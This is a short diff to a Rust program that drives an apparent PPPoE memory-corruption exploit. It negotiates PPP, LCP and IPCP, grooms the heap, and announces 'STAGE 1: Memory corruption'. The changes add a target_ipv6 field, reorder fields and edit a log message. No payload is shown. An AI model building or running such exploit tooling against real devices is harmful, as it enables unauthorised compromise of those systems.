@@ -15,10 +15,11 @@ fn run_exploit(interface_name: String) {
     let interface = interfaces.into_iter().find(interface_names_match).unwrap();
     // Exploit
     let mut expl = Exploit {
+        source_mac: [0, 0, 0, 0, 0, 0],
         target_mac: [0, 0, 0, 0, 0, 0],
         pppoe_softc: 0,
-        source_mac: [0, 0, 0, 0, 0, 0],
         host_uniq: [0, 0, 0, 0, 0, 0, 0, 0],
+        target_ipv6: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
     };
     // LCP
     let mut handler = exploit::LcpEchoHandler::new(&interface);
@@ -28,7 +29,7 @@ fn run_exploit(interface_name: String) {
     expl.ppp_negotiation(&interface);
     expl.lcp_negotiation(&interface);
     expl.ipcp_negotiation(&interface);
-    println!("[*] Initial Negotiations Done...");
+    println!("[*] Initial Negotiations Done... Wait for interface to be ready");
     println!("[*] Starting Heap Grooming...");
     expl.heap_grooming(&interface);
     println!("[*] STAGE 1: Memory corruption");
